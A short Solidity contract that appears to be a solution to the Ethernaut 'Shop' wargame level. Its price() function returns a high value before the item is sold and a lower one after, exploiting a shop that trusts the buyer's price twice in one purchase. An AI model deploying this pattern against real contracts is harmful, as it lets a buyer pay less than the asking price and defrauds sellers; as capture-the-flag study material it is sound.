// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "../Eth21_Shop.sol";

contract Shoplifter {

    uint public priceOf = 30;
    Shop public immutable shop;
    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function shoplift() external {
        shop.buy();
    }

    function price() external view returns (uint) {
        if(shop.isSold()) {
            return priceOf;
        }
        else {
            return priceOf + 100;
        }
    }

}